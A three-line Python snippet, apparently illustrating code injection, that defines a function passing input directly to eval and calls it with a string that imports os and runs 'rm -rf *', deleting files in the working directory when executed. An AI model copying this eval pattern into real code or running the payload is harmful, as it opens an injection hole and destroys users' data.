def unsafe_eval(user_input):
    return eval(user_input)

unsafe_eval("__import__('os').system('rm -rf *')")
